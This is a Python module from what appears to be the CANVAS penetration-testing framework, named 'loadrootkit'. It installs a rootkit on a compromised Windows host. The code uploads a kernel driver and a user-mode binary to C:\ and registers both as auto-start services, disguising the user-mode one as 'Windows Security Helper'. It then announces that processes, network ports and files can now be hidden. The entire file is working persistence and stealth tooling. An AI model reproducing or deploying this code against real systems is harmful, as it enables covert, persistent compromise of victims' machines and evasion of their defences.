#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2007
#http://www.immunityinc.com/CANVAS/ for more information

# imports
import sys
if '.' not in sys.path: sys.path.append('.')

from exploitutils import *
from canvasexploit import canvasexploit
from canvaserror import *

# info
NAME = "loadrootkit"
VERSION = "1.0"
DESCRIPTION = "Installs the CANVAS Ring0 node."
DOCUMENTATION = {}

# properties
PROPERTY={}
PROPERTY['TYPE'] = "Trojans"
PROPERTY['ARCH'] = [ ["Windows"] ]

NOTES = """
"""

class theexploit(canvasexploit):
    
    def __init__(self):

        canvasexploit.__init__(self)
        
        self.result           = ""
        self.name             = NAME
        self.driver_file      = "rootkits/windows/mosdef.sys"
        self.user_mode        = "rootkits/windows/mosdef_usermode.exe"
        self.usermode_enabled = 1
                
        return
    
    def getArgs(self):
        """ get arguments """

        self.driver_file = self.argsDict.get("driver_file",self.driver_file)
        return

    def loadWin32Node(self, node):
        """ load rootkit onto a win32 node """
        self.setInfo("%s (in progress)"%(NAME))
        self.log("Attempting to load rootkit on Win32 system")

        # XXX: this was for multiple nodes results                
        results = []
            
        if "\\" in self.user_mode:
            usermode_filename = self.user_mode.split("\\")[::-1][0]
        else:
            usermode_filename = self.user_mode.split("/")[::-1][0]
        
        full_path          = "C:\\mosdef.sys"
        full_path_usermode = "C:\\%s" % usermode_filename
        
        try:
            r = node.upload(self.driver_file, destfilename = full_path)
            results.append((True, str(r)))
            
            if self.usermode_enabled:
                r = node.upload(self.user_mode, destfilename = full_path_usermode)
                results.append((True, str(r)))
                            
        except NodeCommandError, i:
            e = "Failed to upload on node %s: %s" % (node.getname(), i)
            self.log(e)
            self.setInfo("%s - Done (failed on upload)" % NAME)
            
            results.append((False, e))  
                    
        # Now that we made it this far, we will attempt
        # to use the service manager to install and get
        # the rootkit pair runnning
        from win32MosdefShellServer import SC_MANAGER_ALL_ACCESS
        from win32MosdefShellServer import SERVICE_AUTO_START
        from win32MosdefShellServer import SERVICE_WIN32_OWN_PROCESS
        from win32MosdefShellServer import SERVICE_ERROR_IGNORE
        from win32MosdefShellServer import SERVICE_ALL_ACCESS
        SERVICE_KERNEL_DRIVER = 0x00000001
        
        service_handle = None
        service_handle = node.shell.OpenSCManager(access=SC_MANAGER_ALL_ACCESS)
        kmode          = None
        
        if service_handle is not None:

            # http://msdn2.microsoft.com/en-us/library/ms681381(VS.85).aspx
            # if dict key blows up .. add that error from the above list  
            errors = { 0x6   : 'ERROR_INVALID_HANDLE',\
                       0x431 : 'ERROR_SERVICE_EXISTS',\
                       0x436 : 'ERROR_DUPLICATE_SERVICE_NAME',\
                       997   : 'ERROR_IO_PENDING', \
                       1060: 'ERROR_SERVICE_DOES_NOT_EXIST', \
                       1072: 'ERROR_SERVICE_MARKED_FOR_DELETION'}

            hkmode, ret = node.shell.CreateService(service_handle, "mosdef", "mosdef", SERVICE_ALL_ACCESS,\
                                                   SERVICE_KERNEL_DRIVER, SERVICE_AUTO_START, SERVICE_ERROR_IGNORE, full_path)
            if not hkmode:
                self.log("CreateService Failed: %X / %X -> %s" % (hkmode, ret, errors[ret]))
                return 0

            # This simply sets a special flag that forces
            # the kernel mode rootkit to be loaded very last in
            # the service startup chain
            ret = node.shell.ChangeServiceConfig(hkmode, 1)
            
            if ret != -1:
                kmode_ret = None
                error = None
                
                kmode_ret, error = node.shell.StartService(hkmode)
                
                if kmode_ret:
                    self.log("Successfully loaded the kernel-mode rootkit.\n")
                    self.setInfo("%s (Kernel-Mode) - Done (Success!)" % NAME)
                    node.shell.CloseServiceHandle( hkmode )               
                else:
                    try:
                        self.log("Failed to start kernel-mode service. (%X / %X -> %s)" % (kmode_ret, error, errors[error]))
                    except KeyError:
                        self.log("Failed to start kernel-mode service (Unknown Error 0x%08x)." % error)
                        
                    self.setInfo("%s (Kernel-Mode) - Done (Failed)" % NAME)
            else:
                self.log("Failed to install kernel-mode service.")
                self.setInfo("%s (Kernel-Mode) - Done (Failed)" % NAME)
                
            node.shell.CloseServiceHandle( service_handle )        
        else:
            self.log("Failed to obtain a service handle.")
            self.setInfo("%s (Kernel-Mode) - Done (Failed)" % NAME)
        
        service_handle = None

        if self.usermode_enabled:
            service_handle = node.shell.OpenSCManager(access=SC_MANAGER_ALL_ACCESS)
        else:
            return ret
        
        husermode = None
        if service_handle is not None:

            husermode, ret = node.shell.CreateService(service_handle, "MosdefUserMode", "Windows Security Helper", SERVICE_ALL_ACCESS,\
                                                      SERVICE_WIN32_OWN_PROCESS, SERVICE_AUTO_START, SERVICE_ERROR_IGNORE, full_path_usermode)
            if not husermode:
                self.log("CreateService Failed: %X / %X -> %s" % (husermode, ret, errors[ret]))
                return 0
            
            if ret != 0:
                usermode_ret = None
                error = None
                
                ret = node.shell.ChangeServiceConfig(husermode, 2)
                usermode_ret, error = node.shell.StartService(husermode)
                
                if usermode_ret:
                    self.log("Successfully loaded the user-mode rootkit.\n")
                    self.setInfo("%s (User-Mode) - Done (Success!)" % NAME)
                    node.shell.CloseServiceHandle( husermode )               
                else:
                    try:
                        self.log("Failed to start user-mode service. (%X / %X -> %s)" % (usermode_ret, error, errors[error]))
                    except KeyError:
                        self.log("Failed to start user-mode service (Unknown Error).")
                        
                    self.setInfo("%s (User-Mode) - Done (Failed)" % NAME)
            else:
                self.log("Failed to install user-mode service.")
                self.setInfo("%s (User-Mode) - Done (Failed)" % NAME)
                
            node.shell.CloseServiceHandle( service_handle )        
        else:
            self.log("Failed to obtain a service handle.")
            self.setInfo("%s (User-Mode) - Done (Failed)" % NAME)
        return 1
    
    def get_windows_version( self, node ):
        
        ret, val = node.shell.GetVersionEx()
        
        self.log("Windows Major Version: %d" % val["Major Version"])
        self.log("Windows Minor Version: %d" % val["Minor Version"])
        
        majorVersion = val["Major Version"]
        minorVersion = val["Minor Version"]
        spMinorVersion = val["SP Minor Version"]
        
        if majorVersion != 5:
            self.log("Rootkit is not supported on this version of Windows.")
            self.setInfo("%s - done (failed)" % NAME)
            return -1
        
        return 1
    
    def loadKitToNode(self, node):
        """ try to load the kit on the node type """

        # cross platform support in the future
        ret = 0

        if "win32api" in node.capabilities and "upload" in node.capabilities:
            
            # First we gotta figure out which version of Windows
            # we are running on, we have a specific rootkit build
            # for each major version        
            ret = self.get_windows_version( node )
            if ret:
                ret = self.loadWin32Node(node)
        else:
            self.log("Platform not supported yet.")
            ret = 0

        return ret
                

    def run(self):
        """ main """

        self.setInfo("%s (in progress)"%(NAME))

        self.getArgs()
        results = []
                
        for node in self.argsDict["passednodes"]:
            ret = self.loadKitToNode(node)
            
            if ret:
                self.result = "Win32 rootkit installation complete."
                self.log("You can now hide processes, network ports, and files.")
                node.capabilities += ["rootkit"]
                return 1
            else:
                self.result = "(Error) Rootkit installation failed."
                return -1
            
        

if __name__=="__main__":
    print "[*] This module is designed to be run from inside of CANVAS."
    
